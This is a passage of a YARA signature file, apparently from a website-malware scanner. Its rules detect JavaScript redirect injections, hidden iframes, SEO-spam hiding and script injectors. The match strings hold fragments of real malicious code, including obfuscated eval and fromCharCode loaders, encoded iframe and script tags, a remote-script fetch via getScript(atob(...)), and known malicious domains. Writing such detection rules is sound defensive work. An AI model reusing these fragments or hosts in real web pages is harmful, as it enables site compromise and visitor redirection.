        $trigger and PR00638 and PR01137
}

private rule PR01138 : trigger
{
    strings:
        $ps0 = "script src"
    condition:
        $ps0
}

rule js_redirect_mass_injection_023 : redirect
{
    strings:
        $trigger = "storerightdesicion.com"
    condition:
        $trigger and PR00050 and PR01138
}

private rule PR01139 : trigger
{
    strings:
        $ps0 = "46,99,108,97,115,115,105,99,112,97,114,116,110,101,114,115,104,105,112,115,46,99,111,109,"
    condition:
        $ps0
}

private rule PR01140 : trigger
{
    strings:
        $ps0 = "function() {var"
    condition:
        $ps0
}

rule js_redirect_mass_injection_024 : redirect
{
    strings:
        $trigger = ".parentNode.insertBefore("
    condition:
        $trigger and PR00323 and PR01139 and PR01140
}

private rule PR01141 : trigger
{
    strings:
        $ps0 = "102,117,110,99,116,105,111,110,32,109,97,107,101,100,115,99,114,40,41,123,10,118,97,114,32,100,61,100,111,99,117,109,101,110"
    condition:
        $ps0
}

private rule PR01142 : trigger
{
    strings:
        $ps0 = "107,101,100,115,99,114,40,41,59,10,125));"
    condition:
        $ps0
}

rule js_redirect_mass_injection_025 : redirect
{
    strings:
        $trigger = "fromCharCode"
    condition:
        $trigger and PR00029 and PR01141 and PR01142
}

private rule PR01143 : trigger
{
    strings:
        $ps0 = "/*codeexamplescript*/"
    condition:
        $ps0
}

rule js_redirect_mass_injection_025_02 : redirect
{
    strings:
        $trigger = "fromCharCode"
    condition:
        $trigger and PR00029 and PR01143 and PR01142
}

private rule PR01144 : trigger
{
    strings:
        $ps0 = "fastcheck.top"
    condition:
        $ps0
}

rule js_redirect_mass_injection_026 : redirect
{
    strings:
        $trigger = "if (screen.width <= 1100) {"
    condition:
        $trigger and PR00371 and PR00050 and PR01144
}

private rule PR01145 : trigger
{
    strings:
        $ps0 = "xxxmedia.bid"
    condition:
        $ps0
}

rule js_redirect_mass_injection_026_02 : redirect
{
    strings:
        $trigger = "if (screen.width <= 1100) {"
    condition:
        $trigger and PR00371 and PR00050 and PR01145
}

private rule PR01146 : trigger
{
    strings:
        $ps0 = "molingvarballheart.cf"
    condition:
        $ps0
}

rule js_redirect_mass_injection_026_03 : redirect
{
    strings:
        $trigger = "if (screen.width <= 1100) {"
    condition:
        $trigger and PR00371 and PR01146 and PR00050
}

rule js_redirect_mass_injection_027 : redirect
{
    strings:
        $trigger = "distcumsrariwantecn.cf"
    condition:
        $trigger and PR00261
}

rule js_redirect_mass_injection_028 : redirect
{
    strings:
        $trigger = "if(strpos($actual_link,\"/wp-login.php\")!==false)"
    condition:
        $trigger
}

rule js_redirect_window_location_001 : redirect
{
    strings:
        $trigger = "function GetCookie(_0x"
    condition:
        $trigger and PR00323
}

rule js_redirect_window_location_002 : redirect
{
    strings:
        $trigger = "redir = urls[rand(0, urls.length-1)]"
    condition:
        $trigger
}

private rule PR01147 : trigger
{
    strings:
        $ps0 = "temp=temp+String.fromCharCode"
    condition:
        $ps0
}

private rule PR01148 : trigger
{
    strings:
        $ps0 = "eval(temp);"
    condition:
        $ps0
}

rule js_redirect_window_location_003 : redirect
{
    strings:
        $trigger = "var str=["
    condition:
        $trigger and PR01147 and PR01148
}

rule js_redirect_window_location_004 : redirect
{
    strings:
        $trigger = "%20%20%20%20%73%63%72%69%70%74%2E%73%65%74%41%74%74%72%69%62%75%74%65%28%27%73%72%63%27%2C%20%22%68%74%74%70%3A%2F%2F%39%31%2E%32%33%39%2E%31%35%2E%36%31%2F%67%6F%6F%67%6C%65%2E%6A%73%22%29%0A%20%20%20%20%20%20%20"
    condition:
        $trigger and PR00769
}

rule js_redirect_window_location_005 : redirect
{
    strings:
        $trigger = "'var s=document.referrer;if(s.2"
    condition:
        $trigger
}

rule js_redirect_window_location_006 : redirect
{
    strings:
        $trigger = "wearilyc=\"\"; for(wearilyd=0;wearilyd<wearilyb.length;wearilyd++) { wearilyc+=String.fromCharCode"
    condition:
        $trigger and PR00050
}

private rule PR01149 : trigger
{
    strings:
        $ps0 = "function createCookie(_0x"
    condition:
        $ps0
}

rule js_redirect_window_location_007 : redirect
{
    strings:
        $trigger = "document"
    condition:
        $trigger and PR01149
}

rule js_redirect_window_location_009 : redirect
{
    strings:
        $trigger = "window.location=\"data:text/html;charset=utf-8;base64,PCFET"
    condition:
        $trigger
}

rule js_redirect_window_location_010 : redirect
{
    strings:
        $trigger = "window.location=\"mail.htm?cmd="
    condition:
        $trigger
}

private rule PR01150 : trigger
{
    strings:
        $ps0 = ")){window.location.href=\"http:"
    condition:
        $ps0
}

rule js_redirect_window_location_011 : redirect
{
    strings:
        $trigger = "|biso|"
    condition:
        $trigger and PR01150 and PR00604
}

private rule PR01151 : trigger
{
    strings:
        $ps0 = "iPhone|iPad|iPod"
    condition:
        $ps0
}

rule js_redirect_window_location_012 : redirect
{
    strings:
        $trigger = "=join(pop());eval("
    condition:
        $trigger and PR01151
}

rule js_spamseo_bogus_ad_001 : spamseo
{
    strings:
        $trigger = "ca-pub-4503090171770424"
    condition:
        $trigger and PR00641
}

// MANUAL FIX NECESSARY
rule js_spamseo_crypper_001 : spamseo
{
    strings:
        $trigger = "/index/?"
        $js_spamseo_crypper_001_r0 = /window\.location\.replace\(.http:..[^\?]+\/index\/\?[\d]{10}/
    condition:
        $trigger and PR00371 and $js_spamseo_crypper_001_r0
}

rule js_spamseo_hiddeniframe_004 : spamseo
{
    strings:
        $trigger = "<script type=\"text/javascript\">var _0xf"
    condition:
        $trigger
}

rule js_spamseo_hiddeniframe_005 : spamseo
{
    strings:
        $trigger = "|ht|15|mebor|fra|der|scr|no|ing|oll|ig|||if||write|document"
    condition:
        $trigger
}

rule js_spamseo_hiddeniframe_006 : spamseo
{
    strings:
        $trigger = "return(String[\"\\x66\\x72\\x6f\\x6d\\x43\"+"
    condition:
        $trigger
}

rule js_spamseo_hiddeniframe_007 : spamseo
{
    strings:
        $trigger = "data:,String.fromCharCode"
    condition:
        $trigger and PR00050
}

private rule PR01152 : trigger
{
    strings:
        $ps0 = "_hmt = _hmt || [];"
    condition:
        $ps0
}

private rule PR01153 : trigger
{
    strings:
        $ps0 = "allowtransparency="
    condition:
        $ps0
}

rule js_spamseo_hiddeniframe_009 : spamseo
{
    strings:
        $trigger = "hm = document.createElement(\"script\");"
    condition:
        $trigger and PR00664 and PR01152 and PR01153
}

private rule PR01154 : trigger
{
    strings:
        $ps0 = "fromCharCode';i=(i+1)%"
    condition:
        $ps0
}

rule js_spamseo_hiddeniframe_010 : spamseo
{
    strings:
        $trigger = "window[\"eval\"](\"eval\");"
    condition:
        $trigger and PR01154
}

rule js_spamseo_hiddeniframe_011 : spamseo
{
    strings:
        $trigger = "document.write(unescape('%3C%69%66%72%61%6D%65%20%73%74%79"
    condition:
        $trigger and PR00050
}

private rule PR01155 : trigger
{
    strings:
        $ps0 = "String.fromCharCode(eval("
    condition:
        $ps0
}

private rule PR01156 : trigger
{
    strings:
        $ps0 = ";try{--("
    condition:
        $ps0
}

rule js_spamseo_hiddeniframe_012 : spamseo
{
    strings:
        $trigger = ";try{}catch("
    condition:
        $trigger and PR01155 and PR01156
}

private rule PR01157 : trigger
{
    strings:
        $ps0 = ");try{--("
    condition:
        $ps0
}

private rule PR01158 : trigger
{
    strings:
        $ps0 = "[\\\"body\\\"])}catch("
    condition:
        $ps0
}

rule js_spamseo_hiddeniframe_012_02 : spamseo
{
    strings:
        $trigger = ";try{}catch("
    condition:
        $trigger and PR01157 and PR01158 and PR01155
}

// MANUAL FIX NECESSARY
private rule PR01159 : trigger
{
    strings:
        $ps0 = ".style.position = 'absolute';"
    condition:
        $ps0
}

private rule PR01160 : trigger
{
    strings:
        $ps0 = "document.createElement('iframe');"
    condition:
        $ps0
}

rule js_spamseo_hiddeniframe_013 : spamseo
{
    strings:
        $trigger = "document.write('<div id="
        $js_spamseo_hiddeniframe_013_r0 = /\(function[\s]*\(\)[\s]*\{[^\}]+document\.createElement/
    condition:
        $trigger and PR01159 and PR01160 and $js_spamseo_hiddeniframe_013_r0
}

rule js_spamseo_hiddenstyle_002 : spamseo
{
    strings:
        $trigger = "if (navigator.userAgent.match(/msie/i) || navigator.userAgent.match(/opera/i)) { document.write(' <div styl"
    condition:
        $trigger
}

private rule PR01161 : trigger
{
    strings:
        $ps0 = "<div id='HideM"
    condition:
        $ps0
}

rule js_spamseo_hiddenstyle_004 : spamseo
{
    strings:
        $trigger = "getElementById"
    condition:
        $trigger and PR00050 and PR01161
}

private rule PR01162 : trigger
{
    strings:
        $ps0 = "|var|j||length|if|getElementsByTagName|document|for|v|||ne||display|no|style|className|"
    condition:
        $ps0
}

rule js_spamseo_hiddenstyle_011 : spamseo
{
    strings:
        $trigger = "eval(function(p,a,c,k,e,"
    condition:
        $trigger and PR01162
}

private rule PR01163 : trigger
{
    strings:
        $ps0 = "<div class=\""
    condition:
        $ps0
}

private rule PR01164 : trigger
{
    strings:
        $ps0 = "|document|fromCharCode|String|eval|write|"
    condition:
        $ps0
}

rule js_spamseo_hiddenstyle_012 : spamseo
{
    strings:
        $trigger = "return c.toString("
    condition:
        $trigger and PR01163 and PR01164 and PR00604
}

private rule PR01165 : trigger
{
    strings:
        $ps0 = "addEvent('onload',function(){init(options)})})({url:"
    condition:
        $ps0
}

rule js_spamseo_hiddenstyle_013 : spamseo
{
    strings:
        $trigger = "new RegExp"
    condition:
        $trigger and PR00323 and PR01165
}

// MANUAL FIX NECESSARY
private rule PR01166 : trigger
{
    strings:
        $ps0 = "|var"
    condition:
        $ps0
}

private rule PR01167 : trigger
{
    strings:
        $ps0 = "|x6f"
    condition:
        $ps0
}

private rule PR01168 : trigger
{
    strings:
        $ps0 = "|x6d"
    condition:
        $ps0
}

rule js_spamseo_hiddenstyle_014 : spamseo
{
    strings:
        $trigger = "|window"
        $js_spamseo_hiddenstyle_014_r0 = /\[\d\$\[0\]\]\[\d\$\[1\]\]\(\d\$\[2\]\)\[\d\$\[3\]\]\[\d\$\[4\]\]=\d\$\[5\]/
    condition:
        $trigger and PR01166 and PR00604 and PR01167 and PR01168 and $js_spamseo_hiddenstyle_014_r0
}

// MANUAL FIX NECESSARY
private rule PR01169 : trigger
{
    strings:
        $ps0 = "|style|"
    condition:
        $ps0
}

private rule PR01170 : trigger
{
    strings:
        $ps0 = "|none"
    condition:
        $ps0
}

rule js_spamseo_hiddenstyle_014_02 : spamseo
{
    strings:
        $trigger = "|display|"
        $js_spamseo_hiddenstyle_014_02_r0 = /6,6,.document\|getElementById\|[\w]+\|style\|display\|none.\.split/
    condition:
        $trigger and PR01169 and PR01170 and PR00604 and $js_spamseo_hiddenstyle_014_02_r0
}

private rule PR01171 : trigger
{
    strings:
        $ps0 = "document.createElement(\"style\");s.type=\"text/css\";var"
    condition:
        $ps0
}

rule js_spamseo_hiddenstyle_015 : spamseo
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR01171
}

rule js_spamseo_hiddenstyle_016 : spamseo
{
    strings:
        $trigger = "(function(s,r,b,m,l){l.getElementById(b).style["
    condition:
        $trigger and PR00050
}

rule js_spamseo_hiddenstyle_017 : spamseo
{
    strings:
        $trigger = "style.visibility=\"hidden\";document.getElementById(\"links\").style.display=\"none\";"
    condition:
        $trigger
}

private rule PR01172 : trigger
{
    strings:
        $ps0 = "window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x67\\x65\\x74\\x45\\x6c\\x65\\x6d\\x65\\x6e\\x74\\x42\\x79\\x49\\x64\"]"
    condition:
        $ps0
}

rule js_spamseo_hiddenstyle_018 : spamseo
{
    strings:
        $trigger = "<a href=\"http"
    condition:
        $trigger and PR01172 and PR00540 and PR00050
}

private rule PR01173 : trigger
{
    strings:
        $ps0 = "<script>(function(z,c,t,m,o){o.getElementById(t).style['v'+"
    condition:
        $ps0
}

rule js_spamseo_hiddenstyle_019 : spamseo
{
    strings:
        $trigger = "),'is',document)</script>"
    condition:
        $trigger and PR01173
}

rule js_spamseo_hiddenstyle_020 : spamseo
{
    strings:
        $trigger = "+'se';})('lity','lap','"
    condition:
        $trigger and PR00322 and PR00050 and PR00323
}

rule js_spamseo_hideMe_002 : spamseo
{
    strings:
        $trigger = "<script type='text/javascript'>if(document.getElementById('hidehi')"
    condition:
        $trigger
}

rule js_spamseo_iframedoorway_001 : spamseo
{
    strings:
        $trigger = "[\"\\x69\\x6e\\x6e\\x65\\x72\\x48\\x54\\x4d\\x4c\"]=\"\\x3c\\x69\\x66\\x72\\x61\\x6d\\x65 \\x66\\x72\\x61\\x6d\\x65"
    condition:
        $trigger
}

rule js_spamseo_iframedoorway_002 : spamseo
{
    strings:
        $trigger = "x74\\x79\\x3A\\x76\\x69\\x73\\x69\\x62\\x6C\\x65\\x3B\\x27\\x2F\\x3E\\x3C\\x2F\\x64\\x69\\x76\\x3E\"];document.writeln(_$[0]);"
    condition:
        $trigger
}

private rule PR01174 : trigger
{
    strings:
        $ps0 = "n||k[\"\\\\b\\\\c\\\\d\\\\a\\\\f\\\\m\\\\e\"]"
    condition:
        $ps0
}

rule js_spamseo_iframedoorway_003 : spamseo
{
    strings:
        $trigger = "eva"
    condition:
        $trigger and PR01174
}

private rule PR01175 : trigger
{
    strings:
        $ps0 = "window|x76|x78|x2d|x2e|x6b|x23|x79|x7a"
    condition:
        $ps0
}

rule js_spamseo_iframedoorway_004 : spamseo
{
    strings:
        $trigger = "eval(function(p,a,c,k,e,"
    condition:
        $trigger and PR01175
}

rule js_spamseo_iframedoorway_006 : spamseo
{
    strings:
        $trigger = "frameBorder=\"0\";c.style.display=\"none\";c.setAttribute(\"frameBorder\",\"0\");document.body.appendChild(c);c.src=a;return true}}function"
    condition:
        $trigger and PR00050
}

rule js_spamseo_injector_001 : spamseo
{
    strings:
        $trigger = "jQuery(window)[_0xd"
    condition:
        $trigger and PR00719
}

rule js_spamseo_injector_011 : spamseo
{
    strings:
        $trigger = "%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22"
    condition:
        $trigger and PR00029
}

rule js_spamseo_injector_012 : spamseo
{
    strings:
        $trigger = "HhhPD4v=\"\\x75s\\x65\\x72i\\x64A081\\x37\\x46B25"
    condition:
        $trigger
}

rule js_spamseo_injector_013 : spamseo
{
    strings:
        $trigger = "<script>window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x77\\x72\\x69\\x74\\x65"
    condition:
        $trigger
}

rule js_spamseo_injector_014 : spamseo
{
    strings:
        $trigger = "<script>function hashdate "
    condition:
        $trigger
}

private rule PR01176 : trigger
{
    strings:
        $ps0 = "3C696672616D65206E616D653D"
    condition:
        $ps0
}

rule js_spamseo_injector_015 : spamseo
{
    strings:
        $trigger = "document.write("
    condition:
        $trigger and PR01176 and PR00050
}

rule js_spamseo_injector_016 : spamseo
{
    strings:
        $trigger = "if (!tine_jocker()) {"
    condition:
        $trigger and PR00769
}

rule js_spamseo_injector_017 : spamseo
{
    strings:
        $trigger = "\"\\x72\\x65\\x66\\x65\\x72\\x72\\x65\\x72\"];if("
    condition:
        $trigger
}

rule js_spamseo_injector_018 : spamseo
{
    strings:
        $trigger = "XKjhibvlGdj5Wdm1TZ7lCZsUGLrxyYsEGLwhibvlGdj5WdmhCbhZXZ"
    condition:
        $trigger
}

rule js_spamseo_injector_019 : spamseo
{
    strings:
        $trigger = ".swf?myid=4jhg5asd"
    condition:
        $trigger
}

rule js_spamseo_injector_020 : spamseo
{
    strings:
        $trigger = "js_kod2.setAttribute('style','visibility:hidden');"
    condition:
        $trigger and PR00050
}

private rule PR01177 : trigger
{
    strings:
        $ps0 = "|tongjii|"
    condition:
        $ps0
}

rule js_spamseo_injector_021 : spamseo
{
    strings:
        $trigger = "eval(function(p,a,c,k,e,"
    condition:
        $trigger and PR01177
}

rule js_spamseo_injector_022 : spamseo
{
    strings:
        $trigger = "alert (\"VIP 163"
    condition:
        $trigger and PR00050
}

private rule PR01178 : trigger
{
    strings:
        $ps0 = "|element|document|iframe|cumba|innerHTML|var|src|http|"
    condition:
        $ps0
}

rule js_spamseo_injector_023 : spamseo
{
    strings:
        $trigger = "eval(function(p,a,c,k,e,"
    condition:
        $trigger and PR01178
}

private rule PR01179 : trigger
{
    strings:
        $ps0 = "rray"
    condition:
        $ps0
}

rule js_spamseo_injector_024 : spamseo
{
    strings:
        $trigger = "function t(e,r){this.Z=\"\";var JR=z;var cB=new Date();var NV;if(NV!='inX'){NV='inX'};"
    condition:
        $trigger and PR01179
}

rule js_spamseo_injector_025 : spamseo
{
    strings:
        $trigger = "\"\\x67\\x65\\x74\\x44\\x61\\x74\\x65\",\"\\x73\\x65\\x74\\x44\\x61\\x74\\x65\",\"\\x63\\x6F\\x6F\\x6B\\x69\\x65\",\"\\x3D\",\"\\x3B\\x20\\x65\\x78\\x70\\x69\\x72\\x65\\x73\\x3D\""
    condition:
        $trigger
}

rule js_spamseo_injector_027 : spamseo
{
    strings:
        $trigger = "$.getScript(atob(\"aHR0cDovL2pzLmNkbmxpYnMuY29tL2pxdWVyeS5saWJzLmpz\"));"
    condition:
        $trigger
}

private rule PR01180 : trigger
{
    strings:
        $ps0 = ";try{d=document.createElement(\"div\");}catch("
    condition:
        $ps0
}

private rule PR01181 : trigger
{
    strings:
        $ps0 = ")&&window.document)s+=ss[\""
    condition:
        $ps0
}

rule js_spamseo_injector_028 : spamseo
{
    strings:
        $trigger = "){e=eval;}ss=String;"
    condition:
        $trigger and PR01180 and PR00050 and PR01181
}

rule js_spamseo_injector_030 : spamseo
{
    strings:
        $trigger = "\\x2f\\x63\\x68\\x65\\x63\\x6b\\x2d\\x66\\x6c\\x61\\x73\\x68\\x2d\\x75\\x70\\x64\\x61\\x74\\x65\\x2f\\x22\\x20\\x73\\x74\\x79\\x6c\\x65\\x3d\\x22\\x68\\x65\\x69\\x67"
    condition:
        $trigger
}

rule js_spamseo_injector_031 : spamseo
{
    strings:
        $trigger = "vuitton|width|html|"
    condition:
        $trigger and PR00604
}

private rule PR01182 : trigger
{
    strings:
        $ps0 = "];function co(){return 'Code';}function gafu"
    condition:
        $ps0
}

rule js_spamseo_injector_032 : spamseo
{
    strings:
        $trigger = "));$"
    condition:
        $trigger and PR01182
}

private rule PR01183 : trigger
{
    strings:
        $ps0 = "b=document.getElementsByTagName(\"script\")[0];b.parentNode.insertBefore(a,b);})();"
    condition:
        $ps0
}

rule js_spamseo_injector_034 : spamseo
{
    strings:
        $trigger = "script type=\"text/javascript\">(function(){var a=document.createElement(\"script\");a.type=\"text/javascript\";a.async"
    condition:
        $trigger and PR01183
}

rule js_spamseo_injector_035 : spamseo
{
    strings:
        $trigger = "x73\\x63\\x72\\x69\\x70\\x74\\x3E\"];document.writeln(_$[0]);"
    condition:
        $trigger and PR00332
}

private rule PR01184 : trigger
{
    strings:
        $ps0 = "+ Math.floor(Math.random()*9999) + \".js?\""
    condition:
        $ps0
}

private rule PR01185 : trigger
{
    strings:
        $ps0 = "ByTagName(\"bo\"+\"dy\")[0]).appendChild(a);"
    condition:
        $ps0
}

rule js_spamseo_injector_036 : spamseo
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR01184 and PR01185
}

private rule PR01186 : trigger
{
    strings:
        $ps0 = "indexOf(\"google\") > 0 || s.indexOf(\"bing\""
    condition:
        $ps0
}

rule js_spamseo_injector_037 : spamseo
{
    strings:
        $trigger = "self.location ="
    condition:
        $trigger and PR00080 and PR01186
}

private rule PR01187 : trigger
{
    strings:
        $ps0 = "scro' + 'lling=\"yes\" style=\"overflow-x:hidden\" src=\"' + thisur"
    condition:
        $ps0
}

private rule PR01188 : trigger
{
    strings:
        $ps0 = "getElementsByTagName('bo' + sz)[0]"
    condition:
        $ps0
}

rule js_spamseo_injector_038 : spamseo
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR01187 and PR01188
}

rule js_spamseo_injector_039 : spamseo
{
    strings:
        $trigger = "var ClickkyFull = new ClickkyFull("
    condition:
        $trigger and PR00050
}

rule js_spamseo_injector_040 : spamseo
{
    strings:
        $trigger = ".')!=-1){document.write('<script language=\"javascript\">d"
    condition:
        $trigger
}

private rule PR01189 : trigger
{
    strings:
        $ps0 = "style.position=\"absolute\""
    condition:
        $ps0
}

private rule PR01190 : trigger
{
    strings:
        $ps0 = "<iframe name=\"'+"
    condition:
        $ps0
}

private rule PR01191 : trigger
{
    strings:
        $ps0 = ";if(navigator[appVersion_var].indexOf(\"MSIE"
    condition:
        $ps0
}

rule js_spamseo_injector_042 : spamseo
{
    strings:
        $trigger = ")--><script type=\"text/javascript\">var"
    condition:
        $trigger and PR01189 and PR01190 and PR00719 and PR01191
}

private rule PR01192 : trigger
{
    strings:
        $ps0 = "##')[1]);}}};y.send(null);}var"
    condition:
        $ps0
}

private rule PR01193 : trigger
{
    strings:
        $ps0 = "window.on"
    condition:
        $ps0
}

rule js_spamseo_injector_044 : spamseo
{
    strings:
        $trigger = "eval(y.responseText.split('###"
    condition:
        $trigger and PR01192 and PR01193
}

private rule PR01194 : trigger
{
    strings:
        $ps0 = "##')[1]);}}};y.send(null);}geos"
    condition:
        $ps0
}

rule js_spamseo_injector_044_02 : spamseo
{
    strings:
        $trigger = "eval(y.responseText.split('###"
    condition:
        $trigger and PR01194 and PR01193
}

rule js_spamseo_injector_045 : spamseo
{
    strings:
        $trigger = "$BTB.jshost = (document.location"
    condition:
        $trigger and PR00231
}

private rule PR01195 : trigger
{
    strings:
        $ps0 = "|fromCharCode|if|64|z0|Za|write|do|base64test|document|unescape|"
    condition:
        $ps0
}

rule js_spamseo_injector_046 : spamseo
{
    strings:
        $trigger = "eval(function(p,a,c,k,e,"
    condition:
        $trigger and PR00677 and PR01195
}

rule js_spamseo_injector_047 : spamseo
{
    strings:
        $trigger = "[\"\",\"\\x6A\\x6F\\x69\\x6E\",\"\\x72\\x65\\x76\\x65\\x72\\x73\\x65\",\"\\x73\\x70\\x6C\\x69\\x74\",\"\\x3E\\x74\\x70\\x69\\x72\\x63\\x73\\x2F\\x3C\\x3E\\x22"
    condition:
        $trigger and PR00332
}

// MANUAL FIX NECESSARY
private rule PR01196 : trigger
{
    strings:
        $ps0 = "\"\\x6A\\x6F\\x69\\x6E\",\"\\x72\\x65\\x76\\x65\\x72\\x73\\x65\""
    condition:
        $ps0
}

rule js_spamseo_injector_047_03 : spamseo
{
    strings:
        $trigger = "]));</script>"
        $js_spamseo_injector_047_03_r0 = /javascript.>[\s]*var[\s]*_0x[\w]+[\s]*=[\s]*\[\"\",\".x6A.x/
    condition:
        $trigger and PR00332 and PR01196 and $js_spamseo_injector_047_03_r0
}

rule js_spamseo_injector_048 : spamseo
{
    strings:
        $trigger = "googleplatform"
    condition:
        $trigger and PR01035 and PR00050
}

private rule PR01197 : trigger
{
    strings:
        $ps0 = "|adsadsgg"
    condition:
        $ps0
}

private rule PR01198 : trigger
{
    strings:
        $ps0 = "|jQuery"
    condition:
        $ps0
}

rule js_spamseo_injector_049 : spamseo
{
    strings:
        $trigger = "|onload"
    condition:
        $trigger and PR01197 and PR00604 and PR00711 and PR01198 and PR00677
}

private rule PR01199 : trigger
{
    strings:
        $ps0 = "var sUserAgent = navigator.userAgent.toLowerCase();"
    condition:
        $ps0
}

rule js_spamseo_injector_050 : spamseo
{
    strings:
        $trigger = "function myclick()"
    condition:
        $trigger and PR00371 and PR01199
}

private rule PR01200 : trigger
{
    strings:
        $ps0 = "add_action('admin_enqueue_scripts', 'add_js_scripts' );"
    condition:
        $ps0
}

rule js_spamseo_injector_051 : spamseo
{
    strings:
        $trigger = "function add_js_scripts() {"
    condition:
        $trigger and PR01200
}

private rule PR01201 : trigger
{
    strings:
        $ps0 = "f.parentNode.insertBefore(s, f);"
    condition:
        $ps0
}

rule js_spamseo_injector_052 : spamseo
{
    strings:
        $trigger = "<script type=\"text/javascript\"> var kwcid=\"4\"; var kwurl ="
    condition:
        $trigger and PR01201
}

private rule PR01202 : trigger
{
    strings:
        $ps0 = "false}if(isMobile()=== true){document["
    condition:
        $ps0
}

rule js_spamseo_injector_053 : spamseo
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR01202
}

rule js_spamseo_injector_054 : spamseo
{
    strings:
        $trigger = "if(isMobile() === true) {document.write("
    condition:
        $trigger and PR00050
}

rule js_spamseo_injector_055 : spamseo
{
    strings:
        $trigger = "document.write ('<a style=\"display: none\" href="
    condition:
        $trigger and PR00348
}

private rule PR01203 : trigger
{
    strings:
        $ps0 = "()[(!"
    condition:
        $ps0
}

rule js_spamseo_injector_058 : spamseo
{
    strings:
        $trigger = "() { return this; };"
    condition:
        $trigger and PR01203 and PR00725
}

// MANUAL FIX NECESSARY
rule js_spamseo_injector_059 : spamseo
{
    strings:
        $trigger = "73706c697421736c696365216c656e6774682166726f6d43686172436f6465217375627374722163686172436f64654174"
        $js_spamseo_injector_059_r0 = /=\s*'';\s*for\s*\(/
    condition:
        $trigger and PR00647 and $js_spamseo_injector_059_r0
}

rule js_spamseo_injector_060 : spamseo
{
    strings:
        $trigger = "[0])}}if(navigator.userAgent.toLowerCase()"
    condition:
        $trigger and PR00050 and PR00541
}

rule js_spamseo_injector_061 : spamseo
{
    strings:
        $trigger = "&default_keyword=<?php echo $_SERVER['REQUEST_URI"
    condition:
        $trigger and PR00050
}

rule js_spamseo_injector_062 : spamseo
{
    strings:
        $trigger = "\\x76\\x69\\x67\\x6C\\x69\\x6E\\x6B\\x7C\\x6A\\x73\\x7C\\x63\\x6F\\x6D\\x7C\\x73\\x63\\x72\\x69\\x70\\x74\\x7C\\x69\\x6E\\x73\\x65\\x72\\x74\\x42\\x65\\x66\\x6F\\x72\\x65"
    condition:
        $trigger
}

private rule PR01204 : trigger
{
    strings:
        $ps0 = "window.onload = function() { var xdg = document.createElement('iframe');xdg.style.border = \"none\";"
    condition:
        $ps0
}

rule js_spamseo_injector_063 : spamseo
{
    strings:
        $trigger = "document.body.appendChild"
    condition:
        $trigger and PR01204
}

rule js_spamseo_injector_064 : spamseo
{
    strings:
        $trigger = "window,document,'script','//cdn.owlcdn.com"
    condition:
        $trigger and PR00267 and PR00050
}

rule js_spamseo_injector_065 : spamseo
{
    strings:
        $trigger = "--><script>document.write(unescape(\"%3Cscript%3Eif%28SC%21%3D1%29%7Bfunction%"
    condition:
        $trigger
}

private rule PR01205 : trigger
{
    strings:
        $ps0 = ".js';var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(st,s)})();"
    condition:
        $ps0
}

rule js_spamseo_injector_067 : spamseo
{
    strings:
        $trigger = "(function(){var st=document.createElement('script');st.type='text/javascript';st.async=true;st.charset='utf-8';st.src="
    condition:
        $trigger and PR01205
}

rule js_spamseo_injector_068 : spamseo
{
    strings:
        $trigger = "createElement','script','onload','src','http"
    condition:
        $trigger and PR00647
}

rule js_spamseo_injector_068_02 : spamseo
{
    strings:
        $trigger = "https://cdn.letmeplayformoney.com/main.js"
    condition:
        $trigger and PR00050
}

private rule PR01206 : trigger
{
    strings:
        $ps0 = "document.body.innerHTML = document.body.innerHTML.replace("
    condition:
        $ps0
}

rule js_spamseo_injector_069 : spamseo
{
    strings:
        $trigger = "if (/google/i.test(navigator.userAgent)) {"
    condition:
        $trigger and PR01206 and PR00348
}

private rule PR01207 : trigger
{
    strings:
        $ps0 = ")eval(ss.fromCharCode.apply(ss,a));"
    condition:
        $ps0
}

rule js_spamseo_injector_071 : spamseo
{
    strings:
        $trigger = "\";asd=function(){d.body++};a=(\""
    condition:
        $trigger and PR01207
}

private rule PR01208 : trigger
{
    strings:
        $ps0 = "aG9zdG5hbWU="
    condition:
        $ps0
}

rule js_spamseo_injector_072 : spamseo
{
    strings:
        $trigger = "unction('return\\x20(function()\\x20'+'{}.constructor(\\x22return\\x20this\\x22)(\\x20)'+');"
    condition:
        $trigger and PR00644 and PR01208 and PR00637
}

private rule PR01209 : trigger
{
    strings:
        $ps0 = "<a href"
    condition:
        $ps0
}

private rule PR01210 : trigger
{
    strings:
        $ps0 = "<div id"
    condition:
        $ps0
}

private rule PR01211 : trigger
{
    strings:
        $ps0 = "|x74|getElementById|style|display|var|window'.split('|'),0,{}))"
    condition:
        $ps0
}

rule js_spamseo_injector_073 : spamseo
{
    strings:
        $trigger = "fromCharCode"
    condition:
        $trigger and PR00029 and PR01209 and PR01210 and PR01211
}

// MANUAL FIX NECESSARY
private rule PR01212 : trigger
{
    strings:
        $ps0 = "%2===1)"
    condition:
        $ps0
}

private rule PR01213 : trigger
{
    strings:
        $ps0 = ")!==-1"
    condition:
        $ps0
}

rule js_spamseo_injector_074 : spamseo
{
    strings:
        $trigger = ";for(var"
        $js_spamseo_injector_074_r0 = /\(function\(\)\{var [\w]+=(navigator|document)[^\n]+var [\w]+=['\"]{2};for\(var [\w]+=[\w]+\.length-1;[^\}]+\}[\s]*return/
    condition:
        $trigger and PR01212 and PR00323 and PR01213 and $js_spamseo_injector_074_r0
}

// MANUAL FIX NECESSARY
rule js_spamseo_injector_074_02 : spamseo
{
    strings:
        $trigger = ";for(var"
        $js_spamseo_injector_074_02_r0 = /if\([\w]+===undefined\)\{var [\w]+=true;/
    condition:
        $trigger and PR01212 and PR00323 and PR01213 and $js_spamseo_injector_074_02_r0
}

private rule PR01214 : trigger
{
    strings:
        $ps0 = "Math.random();}setTimeout(function(){localStorage.setItem("
    condition:
        $ps0
}

rule js_spamseo_injector_074_03 : spamseo
{
    strings:
        $trigger = "screen"
    condition:
        $trigger and PR01214 and PR00621 and PR00323
}

// MANUAL FIX NECESSARY
private rule PR01215 : trigger
{
    strings:
        $ps0 = "function(){localStorage.setItem("
    condition:
        $ps0
}

rule js_spamseo_injector_074_04 : spamseo
{
    strings:
        $trigger = "screen"
